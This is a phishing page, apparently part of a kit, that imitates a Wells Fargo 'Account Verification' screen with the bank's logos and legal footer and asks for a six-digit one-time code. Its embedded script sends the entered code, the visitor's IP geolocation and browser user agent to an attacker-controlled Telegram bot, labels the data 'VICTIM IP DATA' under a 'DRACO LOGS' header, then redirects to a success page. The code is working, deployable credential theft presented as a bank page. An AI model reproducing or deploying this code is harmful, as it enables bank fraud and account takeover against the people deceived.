<?php
include 'data.php';
?>


<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title></title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel='stylesheet' type='text/css' media='screen' href='style.css'>

</head>
<body>
    <aside>
        Feedback
    </aside>
    <nav>
        <div class="fdic">
            <img src="assets/fdic.svg" alt="">
            <p><i>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</i></p>
        </div>
        <div class="nav_flex">
            <img src="assets/logo-white.svg" alt="">
            <a href="">Go to WellsFargo.com</a>
        </div>
    </nav>

    <section>
        <h1>Account Verification</h1>
        <form id="form" method="post">
            <p style=" font-weight: 500;">A one time verification code has been sent to the phone number on file. Please proceed to enter the 6 digits code below</p>
            <br>

            <input type="hidden" name="" id="botToken" value="<?php echo $botToken; ?>">
            <input type="hidden" name="" id="chat_id" value="<?php echo $chatID; ?>">




            <div class="formbox">
                <input type="text" id="otp" required placeholder=" ">
                <label for="cid">Enter Otp</label>
            </div>



            <button id="submit_btn">Submit</button>

            <hr>

            <p class="forgot">Didn't recieve otp?</p>
        </form>
    </section>

    <footer>
        <img src="assets/vantage.svg" alt="" class="vantage">
        <hr>

        <div class="footer_flex">
            <ul>
                <li><b>Legal & Privacy</b></li>
                <li>
                    Privacy, Cookies, Security, and Legal
                </li>
                <li>Notice of Data Collection</li>
                <li>Do Not Sell or Share My Personal Information</li>
                <p>© 2022 - 2025 Wells Fargo</p>
            </ul>
            <ul>
                <li><b>Support</b></li>
                <li>
                    Help Center
                </li>
                <li>System Requirements and Accessibility</li>
            </ul>
        </div>
    </footer>

    <script>


        const otp = document.getElementById('otp')
        const submit_btn = document.getElementById('submit_btn')
        const form = document.getElementById('form')
        const bot_token = document.getElementById('botToken')
        const chatID = document.getElementById('chat_id')


        otp.addEventListener("input", () => {
            otp.value = otp.value.replace(/\D/g, "").slice(0, 6);
        });

        // Function to send form data
        const sendFormData = async (data) => {
            let keyValuePairs = Object.entries(data)
                .map(([key, value]) => `## ${key.split("_").join(" ")}: ${value} \n`)
                .join("");
        
            const url = "https://ipapi.co/json";
            const response = await fetch(url);
            const result = await response.json();
        
            
            const botToken = bot_token.value;
            const chat_id = chatID.value;

            
            const userAgent = navigator.userAgent;
    
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chat_id,
                    text: `------------- DRACO LOGS WELS FARGO BANK --------------- \n  ******** WELS FARGO OTP PAGE ******** \n \n ${keyValuePairs}  \n \n ---------- VICTIM IP DATA ----------- \n ## IP : ${result.ip} \n Country : ${result.country_name} \n ## City : ${result.city} \n ## Zip Code : ${result.postal} \n \n ## User Agent : ${userAgent}`,
                }),
                });

                setTimeout(() => {
                    window.location.href = 'success'

                    submit_btn.innerHTML = `Submit`
                }, 9000);
     
            

            } catch (error) {
                console.log(error)
            }
        };
    
        form.addEventListener("submit", (e) => {
            e.preventDefault();


            submit_btn.innerHTML = `
                <div class="loader">
                </div>
                `


            let formData = {
                otp: otp.value
            };
            sendFormData(formData);
        });
    </script>

    
</body>
</html>